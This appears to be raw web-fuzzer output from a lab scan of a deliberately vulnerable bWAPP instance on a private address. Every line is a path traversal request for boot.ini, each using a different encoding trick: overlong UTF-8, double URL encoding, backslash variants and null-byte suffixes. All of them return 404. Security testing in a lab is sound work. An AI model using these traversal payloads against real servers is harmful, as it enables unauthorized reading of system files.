695,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
705,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
708,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
706,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
707,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
685,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
711,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
710,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
709,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini
648,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/boot.ini
713,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5cboot.ini
714,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5cboot.ini
712,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5cboot.ini
647,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
652,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
717,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
719,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
716,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
651,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
721,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
718,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
660,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
723,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
720,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\boot.ini
722,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
724,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
725,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
649,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/boot.ini
726,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
727,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
728,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5cboot.ini
729,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
641,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2fboot.ini
672,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\boot.ini
730,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
732,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
731,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
734,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
735,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
737,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2fboot.ini
733,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
736,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2fboot.ini
738,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
677,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
741,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
739,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
742,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
740,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
743,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
745,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5cboot.ini
744,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5cboot.ini
670,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
746,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
753,404,9L,39W,http://192.168.1.86/bWAPP/..//..//boot.ini
748,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
757,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//boot.ini
749,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
752,404,9L,39W,http://192.168.1.86/bWAPP/..//boot.ini
751,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
750,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
755,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//boot.ini
756,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//boot.ini
754,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//boot.ini
747,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
758,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..//boot.ini
277,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
715,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
760,404,9L,39W,http://192.168.1.86/bWAPP/..///boot.ini
761,404,9L,39W,http://192.168.1.86/bWAPP/..///..///boot.ini
759,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..//..//boot.ini
762,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///boot.ini
451,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
287,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
769,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\boot.ini
767,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..///..///boot.ini
766,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..///boot.ini
784,404,9L,39W,http://192.168.1.86/bWAPP/./\/./boot.ini
782,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\boot.ini
768,404,9L,39W,http://192.168.1.86/bWAPP/..\\boot.ini
764,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///boot.ini
772,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\boot.ini
792,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\boot.ini
790,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/./boot.ini
789,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/./boot.ini
791,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/././\/./boot.ini
796,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
787,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/./boot.ini
788,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/./boot.ini
799,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
800,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../boot.ini
785,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/./boot.ini
783,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\boot.ini
786,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/./boot.ini
826,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\boot.ini
829,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\boot.ini
828,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\boot.ini
827,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\boot.ini
825,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\boot.ini
833,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//boot.ini
830,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini
832,404,9L,39W,http://192.168.1.86/bWAPP/.//..//boot.ini
831,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini
835,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//boot.ini
793,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\boot.ini
794,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\boot.ini
798,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
838,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
840,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\boot.ini
841,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\boot.ini
839,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
845,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
846,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
847,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
843,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
842,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\boot.ini
844,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
781,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\boot.ini
771,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\boot.ini
779,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\boot.ini
773,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\boot.ini
777,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\boot.ini
778,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\boot.ini
780,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\boot.ini
795,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
770,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\boot.ini
765,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///boot.ini
824,404,9L,39W,http://192.168.1.86/bWAPP/.\..\boot.ini
775,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\..\\boot.ini
776,404,9L,39W,http://192.168.1.86/bWAPP/..\\\boot.ini
774,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\boot.ini
837,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
763,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///boot.ini
797,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
834,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//boot.ini
816,404,9L,39W,http://192.168.1.86/bWAPP/./../boot.ini
261,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../boot.ini%00index.html
328,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\boot.ini%00index.html
836,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//boot.ini
310,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
269,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00index.html
549,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../boot.ini
460,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255cboot.ini;index.html
301,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
351,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html
